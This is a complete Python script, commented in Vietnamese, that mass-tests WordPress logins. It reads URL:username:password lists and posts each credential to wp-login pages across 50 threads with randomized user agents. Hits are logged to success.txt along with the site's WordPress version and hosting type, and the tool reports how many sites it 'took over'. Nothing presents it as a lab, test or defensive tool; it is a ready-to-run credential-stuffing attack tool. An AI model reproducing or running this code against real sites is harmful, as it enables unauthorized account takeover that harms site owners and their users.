#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import time
import argparse
import urllib3
import random
from colorama import Fore, Style, init
import socket
from concurrent.futures import ThreadPoolExecutor

# Khởi tạo colorama
init(autoreset=True)

# Tắt cảnh báo HTTPS không được xác minh
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Biến đếm số trang chiếm quyền thành công
success_count = 0

def log_message(message, level="INFO"):
    """Hàm in ra thông tin với format cố định và màu sắc."""
    colors = {
        "INFO": Fore.CYAN + Style.BRIGHT,
        "SUCCESS": Fore.GREEN + Style.BRIGHT,
        "WARNING": Fore.YELLOW + Style.BRIGHT,
        "ERROR": Fore.RED + Style.BRIGHT,
        "RESET": Style.RESET_ALL,
    }
    print(f"{colors.get(level, '')}{message}{colors['RESET']}")

def save_success(target, username, password, version):
    """Lưu thông tin đăng nhập thành công vào file success.txt."""
    global success_count
    try:
        with open("success.txt", "a", encoding="utf-8") as success_file:
            success_file.write(f"{target}:{username}:{password} (WordPress {version})\n")
        success_count += 1
    except IOError as e:
        log_message(f"Lỗi khi lưu thông tin: {e}", "ERROR")

def is_wordpress_login_page(target_url, timeout=10):
    """Kiểm tra nếu URL dẫn tới trang đăng nhập WordPress hợp lệ."""
    try:
        response = requests.get(target_url, timeout=timeout, verify=False)
        
        if response.status_code != 200:
            return False
        
        # Kiểm tra URL có chứa wp-login.php hoặc các từ khóa liên quan
        if "wp-login.php" not in response.url:
            return False
        
        # Kiểm tra nếu có các trường đăng nhập đặc trưng của WordPress
        if not all(field in response.text for field in ['name="log"', 'name="pwd"', 'name="wp-submit"']): 
            return False

        # Kiểm tra thêm các liên kết lostpassword và register
        if not any(link in response.text for link in ['lostpassword', 'register']):
            return False
        
        return True
    except requests.exceptions.RequestException:
        return False

def get_wordpress_version(session, target_url, timeout=10):
    """Lấy phiên bản WordPress từ trang."""
    try:
        response = session.get(target_url, timeout=timeout, verify=False)
        if response.status_code == 200:
            # Tìm phiên bản trong meta tag generator
            meta_match = re.search(r'<meta name="generator" content="WordPress ([^"]+)"', response.text, re.IGNORECASE)
            if meta_match:
                return meta_match.group(1)

            # Tìm phiên bản trong URL tài nguyên (wp-includes/js)
            script_match = re.search(r'wp-includes/.+?ver=([\d.]+)', response.text, re.IGNORECASE)
            if script_match:
                return script_match.group(1)

            # Kiểm tra phiên bản từ HTML comment
            comment_match = re.search(r'<!--.*?WordPress\s+([\d.]+).*?-->', response.text, re.IGNORECASE)
            if comment_match:
                return comment_match.group(1)
    except requests.exceptions.RequestException as e:
        log_message(f"Lỗi khi kiểm tra phiên bản WordPress: {e}", "ERROR")
    return "Không rõ"

def get_hosting_type(target_url):
    """Kiểm tra loại hosting của website."""
    try:
        domain = re.sub(r"https?://", "", target_url).split('/')[0]
        ip_address = socket.gethostbyname(domain)
        hosting_info = requests.get(f"https://ipinfo.io/{ip_address}/json", timeout=10).json()
        hosting_type = hosting_info.get("org", "Unknown")
        if "Amazon" in hosting_type or "Google" in hosting_type:
            return "Cloud Hosting"
        elif "Hosting" in hosting_type or "Shared" in hosting_type or "GoDaddy" in hosting_type:
            return "Shared Hosting"
        return "Dedicated Server"
    except Exception:
        return "Unknown"

def check_login_success(response):
    """Kiểm tra nếu đăng nhập thành công."""
    if "wp_logged_in" in response.cookies:
        return True
    if "wp-admin" in response.url or "dashboard" in response.text:
        return True
    return False

def print_successful_login(target_url, username, password, version, hosting_type):
    """In thông tin đăng nhập thành công ra màn hình với khung đẹp và màu sắc theo yêu cầu."""
    frame_width = 100
    content_width = frame_width - 4  # 2 cho '║ ' và 2 cho ' ║'

    # Định nghĩa màu sắc cho từng mục
    colors = {
        "target": Fore.CYAN + Style.BRIGHT,       # Xanh nước biển
        "version": Fore.CYAN + Style.BRIGHT,      # Xanh nước biển
        "success": Fore.GREEN + Style.BRIGHT,     # Xanh lá cây sáng
        "hosting": Fore.YELLOW + Style.BRIGHT,    # Vàng sáng (thay thế cho nâu cam)
        "reset": Style.RESET_ALL
    }

    def print_line(line, color_key=None):
        if color_key and color_key in colors:
            # Tính độ dài thực sự của nội dung mà không tính các mã màu
            visible_length = len(line)
            padding_length = content_width - visible_length
            if padding_length < 0:
                # Truncate nếu dòng quá dài
                line = line[:content_width]
                visible_length = len(line)
                padding_length = 0
            padding = ' ' * padding_length
            colored_line = f"{colors[color_key]}{line}{colors['reset']}"
            print(f"║ {colored_line}{padding} ║")
        else:
            print(f"║ {line.ljust(content_width)} ║")

    # In khung
    print("╔" + "═" * (frame_width - 2) + "╗")
    print_line("➤ Kiểm tra mục tiêu:", "target")
    print_line(f"   {target_url[:content_width - 3]}", "target")
    print("╠" + "═" * (frame_width - 2) + "╣")
    print_line(f"➤ Phiên bản WordPress: {version}", "version")
    print("╠" + "═" * (frame_width - 2) + "╣")
    print_line("✅ Thành công đăng nhập:", "success")
    print_line(f"   ➔ URL: {target_url[:content_width - 8]}", "success")
    print_line(f"   ➔ User: {username[:content_width - 9]}", "success")
    print_line(f"   ➔ Password: {password[:content_width - 13]}", "success")
    print("╠" + "═" * (frame_width - 2) + "╣")
    print_line(f"➤ Loại Hosting: {hosting_type}", "hosting")
    print("╚" + "═" * (frame_width - 2) + "╝")

def bruteforce(target_url, username, password, timeout, retries=3):
    """Thực hiện brute-force trên một mục tiêu."""
    session = requests.Session()
    headers = {
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      f"(KHTML, like Gecko) Chrome/{random.randint(70, 100)}.0.{random.randint(3000, 4000)}.{random.randint(50, 150)} Safari/537.36"
    }
    data = {"log": username, "pwd": password, "wp-submit": "Log In"}

    # Kiểm tra URL WordPress
    if not is_wordpress_login_page(target_url, timeout):
        return

    # Thực hiện brute-force
    for attempt in range(retries):
        try:
            response = session.post(target_url, data=data, headers=headers, timeout=timeout, verify=False)
            if check_login_success(response):
                # Chỉ in ra khi đăng nhập thành công
                version = get_wordpress_version(session, target_url, timeout)
                hosting_type = get_hosting_type(target_url)
                print_successful_login(target_url, username, password, version, hosting_type)
                save_success(target_url, username, password, version)
                return
        except requests.exceptions.RequestException as e:
            log_message(f"Lỗi kết nối tại {target_url}: {e}", "ERROR")
        time.sleep(1)

def file_reader(file_name):
    """Đọc và phân tích file đầu vào."""
    try:
        with open(file_name, "r", encoding="utf-8") as f:
            targets = []
            for line in f:
                line = line.strip()
                if not line:
                    continue
                match = re.match(r"(https://.*/wp-login\.php):([^:]+):(.+)", line)
                if match:
                    targets.append(match.groups())
            return targets
    except FileNotFoundError:
        log_message(f"Không tìm thấy file: {file_name}", "ERROR")
        raise SystemExit(1)

def run_bruteforce(targets, timeout):
    """Chạy brute-force xử lý từng mục tiêu tuần tự."""
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(lambda target: bruteforce(*target, timeout), targets)

def parse_args():
    """Phân tích tham số dòng lệnh."""
    parser = argparse.ArgumentParser(description="Công cụ brute-force đăng nhập WordPress.")
    parser.add_argument("--target_file", required=True, help="File chứa danh sách URL:User:Pass")
    parser.add_argument("--timeout", type=int, default=10, help="Thời gian chờ mỗi yêu cầu (mặc định: 10 giây)")
    return parser.parse_args()

if __name__ == "__main__":
    try:
        args = parse_args()

        log_message("Đang đọc danh sách mục tiêu...", "INFO")
        targets = file_reader(args.target_file)

        log_message("Bắt đầu brute-force trên các mục tiêu...", "INFO")
        run_bruteforce(targets, args.timeout)

        log_message(f"Tổng số trang WordPress bị chiếm quyền thành công: {success_count}", "SUCCESS")
    except KeyboardInterrupt:
        log_message("Đã dừng brute-force bởi người dùng. Thoát...", "WARNING")
